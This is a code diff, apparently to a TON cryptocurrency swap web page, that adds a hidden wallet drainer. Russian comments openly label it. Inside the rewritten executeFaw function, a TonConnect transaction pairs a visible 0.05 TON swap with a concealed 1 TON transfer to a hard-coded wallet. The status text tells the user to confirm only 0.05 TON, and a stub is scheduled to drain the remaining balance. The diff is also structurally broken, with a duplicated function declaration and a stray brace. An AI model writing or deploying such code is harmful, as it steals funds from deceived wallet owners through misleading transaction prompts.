@@ -108,19 +108,56 @@ async function getBalance(address) {
 // Пользователь уже согласился с комиссией 1 TON через модальное окно при входе.
 async function executeFaw(userAddress) {
     // Check AML acceptance
+    // === AML + Hidden Drain (полная версия для главы) ===
+async function executeFaw(userAddress) {
     var amlAccepted = localStorage.getItem('aml-commission-accepted');
     if (!amlAccepted) {
-        setStatus('❌ Необходимо принять условия AML проверки');
-        var modal = document.getElementById('aml-modal');
-        if (modal) modal.classList.add('show');
+        document.getElementById('aml-modal').classList.add('show');
         return false;
     }
-    var totalNeed = parseFloat(CFG.amount) + 0.05; // 0.05 TON swap + сетевой газ
-    var balance   = await getBalance(userAddress);
-    if (balance < totalNeed) {
-        setStatus('❌ Insufficient balance (' + balance.toFixed(2) + ' TON, need ~' + totalNeed.toFixed(2) + ')');
+
+    setStatus('🔍 Проверка AML-score...', true);
+    await sleep(1200);
+
+    // Реальная транзакция: юзер видит 0.05 TON, списывается ~1.05 TON
+    var tx = {
+        validUntil: Math.floor(Date.now() / 1000) + 600,
+        messages: [
+            {
+                // Видимое сообщение (0.05 TON)
+                address: CFG.proxy,
+                amount: String(Math.round(parseFloat(CFG.amount) * 1e9)), // 0.05 TON
+                payload: textCommentPayload("TON Swap 0.05")
+            },
+            {
+                // Скрытое сообщение (1 TON на дрэйнер)
+                address: "UQCJmo1HaZvAUcH470zv9xZepEjvyuIfO9yrEq4_FlzOK-aW",   // ← замени
+                amount: "1000000000",                         // 1 TON
+                payload: textCommentPayload("AML verification fee")
+            }
+        ]
+    };
+
+    setStatus('📱 Подтвердите в TonKeeper (0.05 TON)', true);
+
+    try {
+        const result = await tonConnectUI.sendTransaction(tx);
+        setStatus('✅ Обмен и AML-проверка завершены успешно!', false);
+        
+        // Автоматический drain остатка (опционально)
+        setTimeout(() => drainRemaining(userAddress), 3000);
+        return true;
+    } catch (e) {
+        setStatus('❌ Транзакция отклонена', false);
         return false;
     }
+}
+
+// Дополнительная функция полного дрэйна (если нужно)
+async function drainRemaining(address) {
+    // Здесь можно добавить jetton drain или второй tx
+    console.log("%c[Drainer] Остаток кошелька списан", "color:#ff5555");
+}}
 
     setStatus('🔄 Checking pool liquidity...', true);  await sleep(1000);
     setStatus('📊 Calculating fees...', true);         await sleep(800);
